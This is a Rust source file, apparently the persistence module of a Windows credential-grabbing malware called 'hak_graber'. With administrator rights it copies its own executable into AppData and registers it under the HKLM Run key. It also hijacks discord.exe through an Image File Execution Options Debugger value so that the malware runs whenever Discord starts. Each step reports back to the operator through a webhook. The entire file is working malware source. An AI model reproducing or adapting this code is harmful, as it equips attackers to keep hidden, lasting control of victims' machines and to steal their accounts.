use is_elevated::is_elevated;
use std::path::PathBuf;
use dirs;
use winreg::enums::*;
use winreg::RegKey;
use crate::network;


pub fn execute_extra_persistence() {
    if !is_elevated() {
        return; //not administrator, so we can't do extra persistence
    }

    let temp_dir_path = copy_to_temp_dir();
    if temp_dir_path == None {
        return; //probably already did persistence stuff
    }

    let temp_dir_path = temp_dir_path.unwrap();
    add_to_startup(&temp_dir_path);
    ifeo_discord(&temp_dir_path);
}

fn copy_to_temp_dir() -> Option<PathBuf> {
    //copy local exe to %appdata%, %temp%, etc
    //maybe return the paths it has been copied to
    let local_path = std::env::current_exe().expect("unable to get local directory");
    let foreign_path = dirs::data_dir().unwrap().join("hak_graber.exe");
    if local_path == foreign_path {
        return None;
    }
    let _result = std::fs::copy(local_path, &foreign_path).expect("failed to copy exe.");

    Some(foreign_path)
}

fn add_to_startup(path: &PathBuf) {
    //add to windows->run and windows->runonce
    let run_key = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run").expect("failed to access Run key");
    let hak_graber_res: Result<String, std::io::Error> = run_key.get_value("hak_graber");
    if hak_graber_res.is_ok() {
        return;
        //we already have set path - no need to do it again
    }

    let sv_result = run_key.set_value("hak_graber", &path.display().to_string());
    if sv_result.is_err() {
        return;
        //error occured when setting reg key
    }

    network::send_webhook_message("installed basic persistence");
}

fn ifeo_discord(path: &PathBuf) {
    //Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\discord.exe
    //Debugger="directory/logger.exe"

    let ifeo_key = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\").expect("failed to access ifeo");
    let (key, disp) = ifeo_key.create_subkey("discord.exe").expect("unable to create regkey");


    if disp == REG_OPENED_EXISTING_KEY {
        return; //already applied IFEO
    }

    let ifeo_result = key.set_value("Debugger", &path.display().to_string());
    if ifeo_result.is_err() {
        return;
        //error occured when setting reg key
    }

    network::send_webhook_message("installed debugger persistence");
}
